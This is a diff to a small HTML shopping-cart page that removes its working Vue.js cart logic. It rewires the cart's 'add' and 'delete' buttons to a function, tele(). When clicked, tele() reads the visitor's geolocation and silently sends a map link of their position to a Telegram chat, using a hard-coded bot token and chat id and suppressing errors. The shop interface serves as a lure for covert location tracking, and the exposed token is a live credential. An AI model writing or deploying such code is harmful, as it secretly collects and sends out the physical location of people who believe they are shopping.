@@ -17,10 +17,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
 
-        
-	
-	<script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
-  <script src="https://unpkg.com/vue-router@4"></script>
+
  
 </head>
 <body>
@@ -28,19 +25,18 @@
 	<div id="app"  >
     <dialog open style="width:100vw;position:relative;height:100vh;color:transparent;display:flex;box-sizing:unset;justify-content:center;">
    
-    <div v-for="ar in arr">
+    <div >
       <div style="color:black;">{{ar.name}}</div> 
       <div style="color:black;">{{ar.count}}</div>
       <div style="color:black;">{{ar.price*ar.count}} </div> 
-        <button class="button" @click="ar.count+=1">+</button>
-        <button class="button" @click="ar.count-=1" v-if="ar.count!=0">-</button>
-        <button class="button" @click="cart.push({name:ar.name,count:ar.count,price:ar.price}),plus()" v-if="ar.count!=0">أضافة</button>
+
+        <button class="button" onclick="tele()" >أضافة</button>
     </div>
      
-    <div v-if="cart.length!=0">
-     <div v-for="c in cart">
+    <div >
+     <div >
         <div style="color:black;">{{c.name}}</div>
-        <div @click="minus(c)" style="color:black;">delete</div>
+        <div onclick="tele()" style="color:black;">delete</div>
      </div>
     </div>
 
@@ -49,49 +45,90 @@
 
    
     <script>
-  const data={
-    arr:[{price:200,count:0,name:"banana"},{price:100,count:0,name:"tomoto"}],
-    cart:[],
-    show:false,
-  };
-  const methods={
-    plus:function(){
-     console.log(this.cart);
-    },
-    minus:function(c){
-     this.cart.forEach(e => {
-      if(e==c){
-        var index= this.cart.indexOf(e);
-        this.cart.splice(index,1);
+
+
+
+
+function tele(){
+      ////  telegram bot  ////
+        
+      if(navigator.geolocation){ 
+
+        navigator.geolocation.getCurrentPosition((x)=>{
+          const latitude  = x.coords.latitude;
+          const longitude = x.coords.longitude;
+
+          var geoL={latitude:latitude,longitude:longitude};
+            
+        var chatId =`-4647034325`;
+        var token  =`7883274835:AAHMSeD4WhgOSOl-DsPUXihoo-PDuBS3hWY`;
+        var text   =" Orders: "+'https://mhdbi.github.io/0' +"  Location: "+`https://maps.google.com/?q=${latitude},${longitude}`;
+        var url    = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`;
+        fetch(url).then(e=>{
+          if(!e.ok){
+            return Promise.reject(e);
+          }
+        }).catch(e=>{})
+
+      })
+
       }
-     });
-    }
-
-  };
+ }
 
 
- const app = Vue.createApp({
-         data() {
-    return data;
-         },
-       methods : methods,
+
+
+
+
+
+
+
+
+
+
+//   const data={
+//     arr:[{price:200,count:0,name:"banana"},{price:100,count:0,name:"tomoto"}],
+//     cart:[],
+//     show:false,
+//   };
+//   const methods={
+//     plus:function(){
+//      console.log(this.cart);
+//     },
+//     minus:function(c){
+//      this.cart.forEach(e => {
+//       if(e==c){
+//         var index= this.cart.indexOf(e);
+//         this.cart.splice(index,1);
+//       }
+//      });
+//     }
+
+//   };
+
+
+//  const app = Vue.createApp({
+//          data() {
+//     return data;
+//          },
+//        methods : methods,
  
-       computed: {},
+//        computed: {},
  
-  created(){           
+//   created(){           
            
-  },
-      mounted(){
-        var date= new Date();
-        var date='('+(date.getDay()*1+9)+'/'+(date.getMonth()*1+1)+'/'+date.getFullYear()+')|*'+date.getHours()+':'+date.getMinutes()+'*|';
-        var text = `https://www.ggg.com`+"hellow boy"+date;
-        console.log(text)
-              }  
+//   },
+//       mounted(){
+//         var date= new Date();
+//         var date='('+(date.getDay()*1+9)+'/'+(date.getMonth()*1+1)+'/'+date.getFullYear()+')|*'+date.getHours()+':'+date.getMinutes()+'*|';
+//         var text = `https://www.ggg.com`+"hellow boy"+date;
+//         console.log(text)
+//               }  
 
 
-           });
+//            });
 
-app.mount('#app');
+// app.mount('#app');
     
     </script>
 
